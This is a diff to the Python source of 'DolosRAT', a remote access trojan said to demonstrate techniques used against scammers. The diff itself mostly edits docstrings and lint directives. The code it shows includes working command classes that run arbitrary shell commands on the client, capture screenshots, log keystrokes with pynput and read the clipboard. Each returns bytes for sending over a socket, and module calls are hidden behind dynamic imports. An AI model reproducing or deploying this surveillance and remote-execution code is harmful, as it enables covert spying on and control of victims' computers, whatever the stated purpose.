@@ -5,6 +5,8 @@
 # Created Date: 06/06/2023
 # version ='1.0'
 # ---------------------------------------------------------------------------
+# pylint: disable=import-error
+# ---------------------------------------------------------------------------
 """
 DolosRAT provides a GUI-based RAT client and server, purposed for demonstrating
 techniques frequently used within scammer take-down operations. Please note that
@@ -22,15 +24,15 @@ from time import sleep
 
 # Modules.
 # Configuration classes.
-from config.config import Config # pylint: disable=import-error
-from config.logger import get_logger_conf # pylint: disable=import-error
-from config.ctkinter import get_ctkinter_conf # pylint: disable=import-error
+from config.config import Config 
+from config.logger import get_logger_conf
+from config.ctkinter import get_ctkinter_conf
 from config.network import network_conf
 # Other utilities.
-from utils.net.interface import IfaWrapper, get_ifa_wrapper # pylint: disable=import-error
-from utils.misc.logger import LoggerWrapper, LoggerLevel, get_logger # pylint: disable=import-error
-from utils.misc.os import check_admin_privs # pylint: disable=import-error
-from ui.ctk import App, get_ctkinter_app # pylint: disable=import-error
+from utils.net.interface import IfaWrapper, get_ifa_wrapper
+from utils.misc.logger import LoggerWrapper, LoggerLevel, get_logger
+from utils.misc.os import check_admin_privs
+from ui.ctk import App, get_ctkinter_app
 
 (__appname__,
  __author__,
@@ -63,84 +65,69 @@ SOFTWARE.
 """
 
 class Command:
-    """_summary_
-
-    Args:
-        ABC (_type_): _description_
+    """Base command class for children to inherit.
+    Exposes 'execute' method to evaluate upon deserialisation.
     """
 
     def __init__(self: object, *args) -> None:
-        """_summary_
+        """Initialises Command."""
 
-        Args:
-            self (object): _description_
-
-        Returns:
-            Any: _description_
-        """
-
+        # Comprises imported modules.
         self._mods: List[Any] = []
         
+        # Houses variable argument for child
+        # commands.
         self._args: List[Any] = args
 
     def get_dep(self: object, mod_name: str) -> Union[Any, None]:
-        """_summary_
+        """Returns imported module for access as needed.
 
         Args:
-            self (object): _description_
-            mod_name (str): _description_
+            mod_name (str): Module name.
 
         Returns:
-            bool: _description_
+            bool: A status indicating whether module
+            is found.
         """
 
+        # Extracts module and index.
         for idx, dep in enumerate(self._mods):
+            # Check if provided module name matches
+            # those inside modules list.
             if dep.__name__ == mod_name:
                 return self._mods[idx]
 
         return None
 
     def create_deps(self: object, *mods: List[str]) -> None:
-        """_summary_
-
-        Args:
-            self (object): _description_
-        """
+        """Import a variable-length list of
+        module names."""
 
         try:
             for mod in mods:
+                # Add imported modules in list for
+                # later access.
                 self._mods.append(import_module(mod))
         except ModuleNotFoundError:
+            # Ignore if importation fails.
             pass
 
     def execute(self: object) -> Any:
-        """_summary_
-
-        Args:
-            self (object): _description_
+        """Executes main logic.
 
         Returns:
-            Any: _description_
+            Any: Data in any form (typically, bytes
+            for transmission in a socket).
         """
 
         pass
     
 class ExecuteCommand(Command):
-    """_summary_
-
-    Args:
-        Command (_type_): _description_
-    """
+    """Allows the execution of user-defined
+    commands on client system."""
 
     def __init__(self: object, *args) -> None:
-        """_summary_
-
-        Args:
-            self (object): _description_
-
-        Returns:
-            Any: _description_
-        """
+        """Initialises ExecuteCommand."""
 
         # Initialise from Command parent.
         super().__init__(args)
@@ -149,18 +136,17 @@ class ExecuteCommand(Command):
         self.create_deps('subprocess', 'time')
 
     def execute(self: object) -> bytes:
-        """_summary_
-
-        Args:
-            self (object): _description_
+        """Executes main logic.
 
         Returns:
-            Any: _description_
-        """
+            Any: Data in byte form."""
         
+        # Bytes to be returned.
         subprocess_output = b''
 
         try:
+            # Execute command via subprocess module, and
+            # capture stdout/stderr.
             process = getattr(self.get_dep('subprocess'),'Popen')(
                 self._args[0],
                 stdout=getattr(self.get_dep('subprocess'),'PIPE'),
@@ -168,32 +154,25 @@ class ExecuteCommand(Command):
                 shell=True
             )
             
+            # If data exists in stderr, return this in
+            # bytes.
             if stderr := process.communicate()[1]:
                 subprocess_output = stderr
             else:
+                # Otherwise, return stdout.
                 subprocess_output = process.communicate()[0]
 
         except getattr(self.get_dep('subprocess'),'CalledProcessError'):
+            # Ignores subprocess exceptions.
             pass
         finally:
             return subprocess_output
 
 class ScreenshotCommand(Command):
-    """_summary_
-
-    Args:
-        Command (_type_): _description_
-    """
+    """Allows the capturing of a client's desktop."""
 
     def __init__(self: object, *args) -> None:
-        """_summary_
-
-        Args:
-            self (object): _description_
-
-        Returns:
-            Any: _description_
-        """
+        """Initialises ScreenshotCommand."""
 
         # Initialise from Command parent.
         super().__init__(args)
@@ -202,14 +181,10 @@ class ScreenshotCommand(Command):
         self.create_deps('PIL.ImageGrab', 'io', 'base64')
 
     def execute(self: object) -> bytes:
-        """_summary_
-
-        Args:
-            self (object): _description_
+        """Executes main logic.
 
         Returns:
-            Any: _description_
-        """
+            Any: Data in byte form."""
 
         # Create bytearray to store bytes for
         # screen capture.
@@ -226,21 +201,10 @@ class ScreenshotCommand(Command):
         return img_bytes.read()
     
 class KeystrokeLogCommand(Command):
-    """_summary_
-
-    Args:
-        Command (_type_): _description_
-    """
+    """Allows the capturing of a client's keystrokes."""
 
     def __init__(self: object, *args) -> Any:
-        """_summary_
-
-        Args:
-            self (object): _description_
-
-        Returns:
-            Any: _description_
-        """
+        """Initialises KeystrokeLogCommand."""
 
         # Initialise from Command parent.
         super().__init__(args)
@@ -248,32 +212,42 @@ class KeystrokeLogCommand(Command):
         # Create list of imported dependencies.
         self.create_deps('threading', 'pynput.keyboard')
         
+        # Keep list of captured keystrokes (chars).
         self._captured_keys: List[str] = []
         
     def _get_char(self: object, key: Any) -> str:
-        """_summary_
+        """Return character of key provided in
+        closure.
+
+        Args:
+            key (Any): pynput.keyboard.Key
 
         Returns:
-            str: _description_
+            str: Character representation of
+            key.
         """
             
         key_char = ''
             
         try:
+            # Assign character representation (if
+            # available).
             key_char = key.char
         except AttributeError:
+            # If this is a special character.
             pass
         finally:
             return key_char
         
     def _on_press(self: object, key: Any) -> None:
-        """_summary_
+        """Processes keypresses.
 
         Args:
-            self (object): _description_
-            key (Any): _description_
+            key (Any): pynput.keyboard.Key.
         """
         
+        # pynput.keyboard.Key enum to perform structural
+        # pattern matching.
         key_enum = getattr(self.get_dep('pynput.keyboard'), 'Key')
         key_press = ''
             
@@ -287,22 +261,21 @@ class KeystrokeLogCommand(Command):
             case key_enum.backspace:
                 key_press = ''
             case _:
+                # Other, non-special keystrokes.
                 key_press = self._get_char(key)
 
         try:
+            # Adds processed keystroke to list, and
+            # convert to bytes for later transmission.
             self._captured_keys.append(str.encode(key_press))
         except TypeError:
             return False
 
     def execute(self: object) -> Any:
-        """_summary_
-
-        Args:
-            self (object): _description_
+        """Executes main logic.
 
         Returns:
-            Any: _description_
-        """
+            Any: Data in byte form."""
 
         # Create keyboard capture, and set on_press to closure.
         key_capture = getattr(self.get_dep('pynput.keyboard'), 'Listener')(on_press=self._on_press)
@@ -315,21 +288,10 @@ class KeystrokeLogCommand(Command):
         return b''.join(self._captured_keys)
     
 class ClipboardCommand(Command):
-    """_summary_
-
-    Args:
-        Command (_type_): _description_
-    """
+    """Allows the capturing of a client's clipboard contents."""
 
     def __init__(self: object, *args) -> Any:
-        """_summary_
-
-        Args:
-            self (object): _description_
-
-        Returns:
-            Any: _description_
-        """
+        """Initialises ClipboardCommand."""
 
         # Initialise from Command parent.
         super().__init__(args)
@@ -338,14 +300,10 @@ class ClipboardCommand(Command):
         self.create_deps('pyperclip')
 
     def execute(self: object) -> Any:
-        """_summary_
-
-        Args:
-            self (object): _description_
+        """Executes main logic.
 
         Returns:
-            Any: _description_
-        """
+            Any: Data in byte form."""
         
         # Houses clipboard contents.
         clipboard_contents = ''
